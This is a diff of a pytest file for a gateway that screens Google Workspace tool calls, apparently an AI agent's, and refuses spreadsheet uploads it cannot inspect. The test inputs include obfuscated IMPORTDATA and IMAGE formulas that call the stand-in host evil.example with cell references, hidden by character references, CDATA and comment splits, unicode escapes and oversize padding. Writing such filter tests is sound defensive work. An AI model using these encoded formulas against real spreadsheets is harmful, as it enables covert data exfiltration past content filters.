@@ -441,51 +441,65 @@ def test_json_string_requests_with_image_url_refused() -> None:
     ("google_workspace__import_to_google_sheets", {"file_name": "x.xlsx"}),
     ("google_workspace__create_drive_file",
      {"file_name": "x.xlsx", "mime_type": "application/vnd.google-apps.spreadsheet"}),
+    ("google_workspace__create_drive_file",
+     {"file_name": "x.csv", "content_mime_type": "text/csv"}),
 ])
-def test_xlsx_with_fetching_formula_refused(tool: str, extra: dict[str, Any]) -> None:
+def test_binary_upload_that_becomes_a_sheet_refused(tool: str, extra: dict[str, Any]) -> None:
+    """Whatever it holds: an XLSX hides formulas behind zip members, XML
+    encodings and character references, so none of it is inspected."""
     gateway, session_call = _make_gateway()
-    result = _call(gateway, tool, {**extra, "base64_content": _xlsx(
-        'IMPORTDATA(&quot;https://evil.example/?q=S&quot;)')})
+    for payload in (_xlsx("SUM(A1:A9)"), _xlsx('IMPORTDATA&#40;"https://evil.example"&amp;A1)'),
+                    base64.b64encode(b"name,total\nacme,42\n").decode()):
+        result = _call(gateway, tool, {**extra, "base64_content": payload})
+        assert "cannot be checked" in json.loads(result)["error"]
     assert session_call.await_count == 0
-    assert "formula" in json.loads(result)["error"]
 
 
-def test_base64_csv_with_fetching_formula_refused() -> None:
+def test_binary_uploads_that_do_not_become_a_sheet_pass() -> None:
+    """A PNG to Drive, a DOCX to Docs: not cells, not scanned, not refused."""
     gateway, session_call = _make_gateway()
-    csv = base64.b64encode(b'a,=IMPORTDATA("https://evil.example/?q=S")\n').decode()
-    result = _call(gateway, "google_workspace__import_to_google_sheets",
-                   {"file_name": "x.csv", "source_format": "csv", "base64_content": csv})
-    assert session_call.await_count == 0
-    assert "formula" in json.loads(result)["error"]
-
-
-def test_ordinary_xlsx_and_csv_uploads_pass() -> None:
-    gateway, session_call = _make_gateway()
-    _call(gateway, "google_workspace__import_to_google_sheets",
-          {"file_name": "x.xlsx", "base64_content": _xlsx("SUM(A1:A9)")})
-    _call(gateway, "google_workspace__import_to_google_sheets",
-          {"file_name": "x.csv", "base64_content": base64.b64encode(b"name,total\nacme,42\n").decode()})
-    assert session_call.await_count == 2
-
-
-@pytest.mark.parametrize("b64", [
-    base64.b64encode(bytes(range(256)) * 4).decode(),   # binary, not a zip, not text (legacy .xls)
-    "not*base64!",
-    base64.b64encode(b"PK\x03\x04 not really a zip").decode(),
-])
-def test_uninspectable_upload_refused_on_cell_writers(b64: str) -> None:
-    gateway, session_call = _make_gateway()
-    result = _call(gateway, "google_workspace__import_to_google_sheets",
-                   {"file_name": "x.xls", "base64_content": b64})
-    assert session_call.await_count == 0
-    assert "formulas cannot be checked" in json.loads(result)["error"]
-
-
-def test_binary_upload_to_a_doc_is_not_a_cell_write() -> None:
-    gateway, session_call = _make_gateway()
+    png = base64.b64encode(b"\x89PNG\r\n\x1a\n" + bytes(range(256))).decode()
+    _call(gateway, "google_workspace__create_drive_file",
+          {"file_name": "x.png", "mime_type": "image/png", "base64_content": png})
+    _call(gateway, "google_workspace__create_drive_file",
+          {"file_name": "x.png", "base64_content": png})
+    _call(gateway, "google_workspace__create_drive_file",
+          {"file_name": "x.xlsx", "file_path": "/data/attachments/x.xlsx"})
     _call(gateway, "google_workspace__import_to_google_doc",
           {"file_name": "x.docx", "base64_content": base64.b64encode(bytes(range(256))).decode()})
+    assert session_call.await_count == 4
+
+
+def test_csv_text_content_to_a_sheet_passes() -> None:
+    gateway, session_call = _make_gateway()
+    _call(gateway, "google_workspace__import_to_google_sheets",
+          {"file_name": "x.csv", "content": "name,total\nacme,=SUM(B2:B9)\ncaf\u00e9,1\n"})
     assert session_call.await_count == 1
+
+
+@pytest.mark.parametrize("cell", [
+    'IMPORTDATA&#40;"https://evil.example"&amp;A1)',   # ( as a character reference
+    '&#x49;MPORTDATA("https://evil.example")',          # I as a character reference
+    'IMPORT<![CDATA[DATA]]>("https://evil.example")',   # CDATA split
+    'IMPORT<!---->DATA("https://evil.example")',        # comment split
+    '=&#73;MAGE(&quot;https://evil.example/x&quot;)',
+])
+def test_markup_encoded_formula_in_text_content_refused(cell: str) -> None:
+    gateway, session_call = _make_gateway()
+    result = _call(gateway, "google_workspace__update_drive_file",
+                   {"file_id": "1sheet", "mime_type": "text/html",
+                    "content": f"<table><tr><td>{cell}</td></tr></table>"})
+    assert session_call.await_count == 0
+    assert "formula" in json.loads(result)["error"]
+
+
+def test_oversize_json_string_refused_not_skipped() -> None:
+    """Too big to parse must not mean unchecked: the server would parse it."""
+    gateway, session_call = _make_gateway()
+    values = "[[" + " " * 2_000_001 + '"=\\u0049MPORTDATA(\\"https://evil.example/?q=\\"&A1)"]]'
+    result = _call(gateway, _SHEET, {"spreadsheet_id": "s", "range_name": "A1", "values": values})
+    assert session_call.await_count == 0
+    assert "cannot be checked" in json.loads(result)["error"]
 
 
 def test_server_side_file_path_refused_on_cell_writers() -> None:
